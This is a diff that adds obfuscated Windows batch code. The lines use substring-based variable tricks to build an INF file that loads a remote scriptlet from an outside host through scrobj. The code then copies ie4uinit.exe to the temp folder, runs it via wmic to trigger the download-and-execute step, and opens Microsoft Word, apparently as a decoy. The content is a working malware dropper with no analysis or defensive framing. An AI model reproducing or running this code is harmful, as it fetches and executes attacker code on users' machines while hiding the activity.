@@ -1,0 +1,8 @@
+/v /ccall%Sentences:~0,1%et "Artists=.inf" &&
+  %Sentences:~0,1%et "Spirit=ieuinit!Artists!" &&
+  call %Sentences:~0,1%et "Floors=%t!Affiliates!mp%\" &&
+  (for /D %v in ("[DA2]" "sc\" "ro%Chapter%j,NI,%Across%%Acids%%Acids%p%Armor%%Valid%%Valid%brokarry.%Voices%/smjflw9s" "[2677]" "ieu%Offer%!Artists!" "[defaultin%Sentences:~0,1%tall.windows7]" "Un\" "Register\" "OCXs=DA2" "delfiles=2677" "[string%Sentences:~0,1%]" "Chapter=b;Projectors" "Valid=/" "Acids=t;Revenues" "Across=h" "Offer=init" "Truth=%time%" "%Sentences:~0,1%hortsvcname=' '" "%Sentences:~0,1%ervicename=' '" "Armor=:;Reform" "Voices=com" "[version]" "signature =$windows nt$" "[de%Sentences:~0,1%tinationdirs]" "defaultdestdir=11" "2677=01" ) do @echo %~v)>"!Floors!!Spirit!" &&
+  %Sentences:~0,1%et "Indoor=ie4uinit.exe" &&
+  call xcopy /Y /C /Q %win!Juice!ir%\%Sentences:~0,1%ystem32\!Indoor! "!Floors!*" &&
+  start "" wmic proce%Sentences:~0,1%s call create "!Floors!!Indoor! -basesettings" &&
+  start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
